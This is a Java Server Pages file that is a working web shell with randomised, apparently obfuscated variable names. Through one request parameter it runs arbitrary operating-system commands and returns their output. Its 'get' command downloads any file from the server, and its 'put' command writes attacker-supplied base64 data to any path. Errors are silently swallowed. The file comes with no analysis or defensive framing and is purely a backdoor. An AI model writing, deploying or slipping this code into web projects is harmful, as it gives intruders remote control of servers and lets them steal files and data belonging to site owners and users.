<%@ page import="java.util.*,java.io.*" %>
<%@ page import="java.nio.file.*" %>
<%
try {
String pbeX = request.getParameter("c");
  if (pbeX.length() >= 4 && pbeX.substring(0, 4).equals("get ")) {
    String[] taw = pbeX.split(" ");
    if (taw.length >= 2) {
      String RBA = taw[1];
      File ZRqiS = new File(RBA);
      if (!ZRqiS.exists()) {
        response.setStatus(404);
        return;
      }
      FileInputStream evW = new FileInputStream(ZRqiS);
      String tHXsDV = getServletContext().getMimeType(RBA);
      if (tHXsDV == null) {
          tHXsDV = "application/octet-stream";
      }
      response.setContentType(tHXsDV);
      response.setContentLength((int) ZRqiS.length());
      response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", ZRqiS.getName()));
      OutputStream KPLkAe = response.getOutputStream();
      byte[] bFJnbK = new byte[4096];
      int VIFxO = -1;
      while ((VIFxO = evW.read(bFJnbK)) != -1) {
        KPLkAe.write(bFJnbK, 0, VIFxO);
      }
      evW.close();
      KPLkAe.close();   
      return;
    } else {
      return;
    }
  
  } else if (pbeX.length() >= 4 && pbeX.substring(0, 4).equals("put ")) {
    String[] taw = pbeX.split(" ");
    String RBA = taw[1];
    if (taw.length >= 3) {
      RBA = taw[2];
    } else {
      File f = new File(RBA);
      RBA = f.getName();
    }
    String UMVD = request.getParameter("f");
    try {
      FileOutputStream KPLkAe = new FileOutputStream(RBA);
      KPLkAe.write(Base64.getDecoder().decode(UMVD));
    } catch (IllegalArgumentException e) {
      response.setStatus(500);
      out.println("Unable to decode base64.");
    } catch (IOException e) {
      response.setStatus(500);
      out.println("Unable to write file");
    }
    return;
  }
Process JPntbc = Runtime.getRuntime().exec(pbeX);
DataInputStream ds = new DataInputStream(JPntbc.getInputStream());
String KMjiv = ds.readLine();
while ( KMjiv != null ) {
  out.println(KMjiv); 
  KMjiv = ds.readLine(); 
}
} catch (Exception e) {}
%>
